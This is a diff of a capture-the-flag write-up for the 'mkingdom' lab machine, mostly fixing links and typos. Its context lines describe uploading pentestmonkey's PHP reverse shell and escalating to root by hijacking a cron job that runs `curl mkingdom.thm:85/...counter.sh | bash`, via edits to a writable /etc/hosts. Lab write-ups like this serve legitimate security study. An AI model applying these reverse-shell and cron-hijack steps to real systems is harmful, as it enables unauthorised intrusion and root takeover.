@@ -113,9 +113,7 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
 ![file_extension](./assets/file_extension.png)
 
 
-* We can use this well knows php reverseshell by pentestmonkey.
-
-https://github.com/pentestmonkey/php-reverse-shell
+* We can use this well known php reverseshell by [pentestmonkey.](https://github.com/pentestmonkey/php-reverse-shell)
 
 
 * We change the ip to our own ip address and port to our desired one inside this reverse shell and upload the file.
@@ -175,7 +173,7 @@ toad@mkingdom:~$
 ```
 ## Privesc to mario
 
-After trying some scripts like [LinPeas.sh] i couldn't find a way to esculate my privilages to root.
+After trying some scripts like [LinPeas.sh](https://github.com/peass-ng/PEASS-ng/releases/tag/20240609-52b58bf5) i couldn't find a way to esculate my privilages to root.
 
 So I started doing manual enumeration and found a suspicious enviromental variable `PWD_token`.
 
@@ -237,11 +235,11 @@ Again I tried doing manual enumeration, but nothing to be found.
 
 ## Privesc to root
 
-Trying this tool gave a result https://github.com/DominicBreuker/pspy
+Trying this tool gave a result [pspy](https://github.com/DominicBreuker/pspy) 
 
 ![cron_1](./assets/cron_1.png)
 
-So there is this `/bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log` cron job running by the root (UID=0). We can exploit this by creating the same path and the script `(/app/castle/application/counter.sh)` in our own machine,start a web server at port 85 and set the domain `mkingdom.thm` to point to us by changing the `/etc/hosts` file since we have write permission to it.
+So there is this `/bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log` cron job running by the root (UID=0). We can exploit this by creating the same path and the script `(/app/castle/application/counter.sh)` in our own machine,start a web server at port 85 and set the domain `mkingdom.thm` to point to us by changing the `/etc/hosts` file since we have write permission on it.
 
 ```bash
 mario@mkingdom:~$ ls -la /etc/hosts
